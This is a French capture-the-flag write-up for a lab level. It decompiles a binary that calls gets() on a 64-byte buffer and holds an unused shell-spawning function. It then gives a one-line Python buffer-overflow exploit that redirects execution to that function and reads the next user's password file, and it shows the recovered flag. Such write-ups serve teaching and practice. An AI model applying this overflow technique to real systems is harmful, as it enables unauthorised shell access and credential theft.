# Rapport CTF - [Level01]

### Observation :
En arrivant sur le level1 on trouve un executable nommé level1. \
Quand nous essayons de le lancer nous pouvons ecrire une chaine de caractere puis le programme se stop. \
Regardons donc avec gdb ou un decompilateur.


### Explication de Code :
En lancant le binaire dans hex-ray ou ghidra nous obtenons :
```c
//----- (08048444) --------------------------------------------------------
int run()
{
  fwrite("Good... Wait what?\n", 1u, 0x13u, stdout);
  return system("/bin/sh");
}

//----- (08048480) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+10h] [ebp-40h] BYREF

  return (int)gets(s);
}
```
On peux voir que il existe une fonction `run()` qui permet de /bin/sh avec l'utilisateur level2. \
Malheureusement cette fonction n'est jamais executer, nous devons donc trouver une maniere de l'executer.

### Solution :

Le but est de lancer la fonction run() pour obtenir un shell avec les droits de l'utilisateur level2
Pour se faire il nous suffit de buffer overflow `s` avec plus de 64 octets pour remplacer l'adresse de retour, cela vas nous faire jump dans notre fonction `run()`

Pour trouver notre adresse de `run` rien de plus simple nous pouvons regarder notre addresse avec gdb ou regarder hex-ray qui nous l'affiche directement au dessus de la fonction `(08048444)`

Comme nous sommes en little endian nous devons donc retourner notre chaine de caractere pour que le binaire puisse le comprendre. \
Cet iterateur python permet de retourner une string : `[::-1]`

Nous regardons ensuite la stack de notre main avec gdb qui est egal a `0x50u` donc 80 octets, pour ecraser l'adresse de notre return, il nous faut donc ecrire `80 - 4 = 76` octets random puis notre address.

On fait la commande suivante pour obtenir le flag :
```sh
(python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])" ; echo "cat /home/user/level2/.pass") | ./level1
```
### Resultat:
```sh
Good... Wait what? 
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```